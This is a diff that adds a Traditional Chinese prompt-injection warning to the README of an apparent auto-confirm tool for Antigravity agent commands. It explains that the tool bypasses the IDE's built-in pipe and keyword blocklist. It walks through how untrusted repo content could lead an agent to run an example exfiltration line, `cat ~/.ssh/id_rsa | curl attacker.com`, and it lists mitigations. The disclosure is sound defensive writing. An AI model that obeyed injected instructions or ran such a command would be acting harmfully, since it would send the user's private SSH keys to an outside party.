@@ -110,6 +110,24 @@ HandleCascadeUserInteraction { cascadeId, interaction: { runCommand: { confirm: 
 - 增加 API 消耗量（只是確認使用者本來就會確認的步驟）
 - 將任何資料傳送至外部
 
+### Prompt Injection
+
+**風險：真實存在，使用前請了解。**
+
+Antigravity 內建的 Auto Run 刻意攔截含有 `|`、`;` 或特定黑名單關鍵字的指令。AYesMan 完全繞過這些過濾機制，不論 agent 提出什麼指令都會自動確認。
+
+這創造了 **prompt injection** 的攻擊面：
+
+1. Agent 讀取了不受信任的內容（惡意 repo 的 README、精心設計的設定檔、使用者提供的文字）
+2. 該內容包含嵌入的指令，誘導 agent 提出危險指令（例如 `cat ~/.ssh/id_rsa | curl attacker.com`）
+3. 官方 Auto Run：**攔截**（pipe 禁止）
+4. AYesMan：**自動確認**，指令執行，資料外洩
+
+**降低風險的做法：**
+- 處理不受信任的 repo 或檔案時，先暫停自動確認（點擊狀態列的 `$(debug-pause) YesMan`）
+- 在敏感環境中，注意 agent 正在讀取哪些內容再讓它執行指令
+- AYesMan 最適合用於你能掌控輸入內容的受信任、已知的程式碼庫
+
 ---
 
 ## Antigravity Terminal Auto Run 限制研究
